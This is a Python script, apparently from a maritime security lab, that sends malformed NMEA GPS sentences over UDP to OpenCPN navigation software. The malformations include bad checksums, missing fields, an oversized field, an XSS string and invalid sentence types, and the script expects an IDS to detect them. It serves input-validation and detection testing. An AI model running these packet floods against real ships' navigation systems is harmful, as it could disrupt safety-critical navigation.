#!/usr/bin/env python3
"""
NMEA Malformed Packet Attack
Protocol Format Attack - Input Validation Failure Demonstration

⚠️ 교육용 입력 검증 실패 시연
   OpenCPN을 크래시시키는 것이 아니라, 잘못된 형식의 NMEA 패킷을 보내
   입력 검증 및 오류 처리 메커니즘을 테스트합니다.

공격 유형:
- invalid_checksum: 체크섬이 틀린 NMEA 문장
- missing_fields: 필수 필드가 누락된 NMEA
- oversized_field: 비정상적으로 긴 필드
- special_chars: 특수문자 포함
- mixed: 여러 malformed 패턴 혼합

목적:
- 프로토콜 레벨 입력 검증의 중요성 시연
- Parser의 오류 처리 능력 테스트
- IDS의 Protocol Anomaly 탐지 검증
"""

import argparse
import sys
import time
import socket
from datetime import datetime

class NMEAMalformedAttack:
    def __init__(self, target_ip='10.10.10.10', target_port=10110):
        """
        NMEA Malformed 공격 초기화

        Args:
            target_ip: Bridge Zone IP (OpenCPN/Listener)
            target_port: NMEA 수신 포트
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # 통계
        self.stats = {
            'packets_sent': 0,
            'normal_sent': 0,
            'malformed_sent': 0
        }

    def calculate_checksum(self, sentence):
        """NMEA 체크섬 계산 (정상)"""
        checksum = 0
        for c in sentence:
            checksum ^= ord(c)
        return checksum

    def generate_normal_gprmc(self):
        """정상 GPRMC 생성 (비교용)"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")
        date_str = now.strftime("%d%m%y")

        # 부산 근처 좌표
        lat = "3506.5000"
        lon = "12907.1000"

        rmc = f"GPRMC,{time_str},A,{lat},N,{lon},E,0.0,0.0,{date_str},,,"
        checksum = self.calculate_checksum(rmc)
        return f"${rmc}*{checksum:02X}\r\n"

    def attack_invalid_checksum(self):
        """체크섬이 틀린 NMEA"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")
        date_str = now.strftime("%d%m%y")

        rmc = f"GPRMC,{time_str},A,3506.5,N,12907.1,E,0.0,0.0,{date_str},,,"
        # 정상 체크섬을 계산하지만 +1 해서 틀리게 만듦
        correct_checksum = self.calculate_checksum(rmc)
        wrong_checksum = (correct_checksum + 1) % 256

        malformed = f"${rmc}*{wrong_checksum:02X}\r\n"
        return malformed

    def attack_missing_fields(self):
        """필수 필드가 누락된 NMEA"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")

        # 정상 GPRMC는 12개 필드, 여기서는 5개만
        malformed = f"$GPRMC,{time_str},A,3506.5,N\r\n"
        return malformed

    def attack_oversized_field(self):
        """비정상적으로 긴 필드"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")
        date_str = now.strftime("%d%m%y")

        # 위도 필드를 비정상적으로 길게
        oversized_lat = "3506." + "5" * 200

        rmc = f"GPRMC,{time_str},A,{oversized_lat},N,12907.1,E,0.0,0.0,{date_str},,,"
        checksum = self.calculate_checksum(rmc)
        malformed = f"${rmc}*{checksum:02X}\r\n"
        return malformed

    def attack_special_chars(self):
        """특수문자 포함"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")
        date_str = now.strftime("%d%m%y")

        # 위도 필드에 특수문자 삽입
        special_lat = "3506.<script>alert('xss')</script>"

        rmc = f"GPRMC,{time_str},A,{special_lat},N,12907.1,E,0.0,0.0,{date_str},,,"
        checksum = self.calculate_checksum(rmc)
        malformed = f"${rmc}*{checksum:02X}\r\n"
        return malformed

    def attack_no_header(self):
        """NMEA 헤더($) 없음"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")
        date_str = now.strftime("%d%m%y")

        # $ 기호 없이 시작
        malformed = f"GPRMC,{time_str},A,3506.5,N,12907.1,E,0.0,0.0,{date_str},,,*00\r\n"
        return malformed

    def attack_invalid_sentence_type(self):
        """존재하지 않는 NMEA 문장 타입"""
        now = datetime.utcnow()
        time_str = now.strftime("%H%M%S.00")

        # GPXXX 같은 존재하지 않는 타입
        invalid = f"GPXXX,{time_str},A,3506.5,N,12907.1,E,0.0,0.0"
        checksum = self.calculate_checksum(invalid)
        malformed = f"${invalid}*{checksum:02X}\r\n"
        return malformed

    def send_packet(self, packet, label=""):
        """패킷 전송"""
        try:
            self.sock.sendto(packet.encode(), (self.target_ip, self.target_port))
            self.stats['packets_sent'] += 1
            print(f"[SENT] {label}")
            print(f"       {packet.strip()}")
            return True
        except Exception as e:
            print(f"[ERROR] Failed to send: {e}")
            return False

    def run_attack(self, mode='invalid_checksum', duration=30, interval=2):
        """
        공격 실행

        Args:
            mode: 공격 모드
            duration: 지속 시간 (초)
            interval: 패킷 전송 간격 (초)
        """
        print("="*60)
        print(f"NMEA Malformed Packet Attack - Mode: {mode.upper()}")
        print("="*60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Interval: {interval} seconds")
        print("="*60)
        print()

        # 공격 함수 매핑
        attack_functions = {
            'invalid_checksum': self.attack_invalid_checksum,
            'missing_fields': self.attack_missing_fields,
            'oversized_field': self.attack_oversized_field,
            'special_chars': self.attack_special_chars,
            'no_header': self.attack_no_header,
            'invalid_type': self.attack_invalid_sentence_type,
        }

        if mode not in attack_functions:
            print(f"[!] Unknown mode: {mode}")
            return

        start_time = time.time()
        packet_count = 0

        try:
            while (time.time() - start_time) < duration:
                # 정상 패킷 1개 (비교용)
                normal = self.generate_normal_gprmc()
                self.send_packet(normal, "[NORMAL] Reference packet")
                self.stats['normal_sent'] += 1
                time.sleep(0.5)

                # Malformed 패킷 1개
                malformed = attack_functions[mode]()
                self.send_packet(malformed, f"[MALFORMED] {mode}")
                self.stats['malformed_sent'] += 1

                packet_count += 1
                elapsed = time.time() - start_time
                print(f"       Packets sent: {packet_count}, Elapsed: {elapsed:.1f}s\n")

                time.sleep(interval)

        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")

        elapsed = time.time() - start_time
        print(f"\n[+] Attack completed (Duration: {elapsed:.1f}s)")

    def run_mixed_attack(self, duration=60, interval=3):
        """모든 malformed 패턴을 순환하며 전송"""
        print("="*60)
        print("NMEA Malformed Packet Attack - Mode: MIXED")
        print("="*60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Interval: {interval} seconds")
        print("="*60)
        print()

        attack_functions = [
            ('invalid_checksum', self.attack_invalid_checksum),
            ('missing_fields', self.attack_missing_fields),
            ('oversized_field', self.attack_oversized_field),
            ('special_chars', self.attack_special_chars),
            ('no_header', self.attack_no_header),
            ('invalid_type', self.attack_invalid_sentence_type),
        ]

        start_time = time.time()
        index = 0

        try:
            while (time.time() - start_time) < duration:
                # 정상 패킷
                normal = self.generate_normal_gprmc()
                self.send_packet(normal, "[NORMAL] Reference")
                self.stats['normal_sent'] += 1
                time.sleep(0.5)

                # Malformed 패킷 (순환)
                mode_name, attack_func = attack_functions[index % len(attack_functions)]
                malformed = attack_func()
                self.send_packet(malformed, f"[MALFORMED] {mode_name}")
                self.stats['malformed_sent'] += 1

                index += 1
                elapsed = time.time() - start_time
                print(f"       Patterns sent: {index}, Elapsed: {elapsed:.1f}s\n")

                time.sleep(interval)

        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")

        elapsed = time.time() - start_time
        print(f"\n[+] Attack completed (Duration: {elapsed:.1f}s)")

    def show_stats(self):
        """통계 출력"""
        print("\n" + "="*60)
        print("Attack Statistics")
        print("="*60)
        print(f"Total packets sent:    {self.stats['packets_sent']}")
        print(f"Normal packets:        {self.stats['normal_sent']}")
        print(f"Malformed packets:     {self.stats['malformed_sent']}")
        print("="*60)


def main():
    parser = argparse.ArgumentParser(
        description='NMEA Malformed Packet Attack - Protocol Format Attack',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  invalid_checksum - NMEA checksum이 틀린 패킷
  missing_fields   - 필수 필드가 누락된 패킷
  oversized_field  - 비정상적으로 긴 필드
  special_chars    - 특수문자 포함
  no_header        - NMEA 헤더($) 없음
  invalid_type     - 존재하지 않는 NMEA 문장 타입
  mixed            - 모든 패턴 순환 전송

Examples:
  # 체크섬 오류 공격
  python3 nmea_malformed_attack.py --target 10.10.10.10 --mode invalid_checksum --duration 30

  # 필드 누락 공격
  python3 nmea_malformed_attack.py --target 10.10.10.10 --mode missing_fields

  # 모든 패턴 혼합
  python3 nmea_malformed_attack.py --target 10.10.10.10 --mode mixed --duration 60

Expected Results:
  - OpenCPN/Listener: 패킷 무시 또는 오류 로그 (크래시 X)
  - Suricata (B Zone): "Invalid NMEA Format" 탐지
  - 입력 검증의 중요성 시연
        """)

    parser.add_argument('--target', default='10.10.10.10',
                       help='Target IP (Bridge Zone, default: 10.10.10.10)')
    parser.add_argument('--port', type=int, default=10110,
                       help='Target port (default: 10110)')
    parser.add_argument('--mode',
                       choices=['invalid_checksum', 'missing_fields', 'oversized_field',
                               'special_chars', 'no_header', 'invalid_type', 'mixed'],
                       default='invalid_checksum',
                       help='Attack mode (default: invalid_checksum)')
    parser.add_argument('--duration', type=int, default=30,
                       help='Attack duration in seconds (default: 30)')
    parser.add_argument('--interval', type=float, default=2.0,
                       help='Interval between packets in seconds (default: 2.0)')

    args = parser.parse_args()

    print("="*60)
    print("NMEA Malformed Packet Attack")
    print("Protocol Format Attack - Input Validation Test")
    print("⚠️  Educational purposes only!")
    print("="*60)
    print()

    # 공격 객체 생성
    attacker = NMEAMalformedAttack(
        target_ip=args.target,
        target_port=args.port
    )

    try:
        if args.mode == 'mixed':
            attacker.run_mixed_attack(
                duration=args.duration,
                interval=args.interval
            )
        else:
            attacker.run_attack(
                mode=args.mode,
                duration=args.duration,
                interval=args.interval
            )
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # 통계 출력
        attacker.show_stats()
        print("\n[+] Attack stopped")


if __name__ == '__main__':
    main()
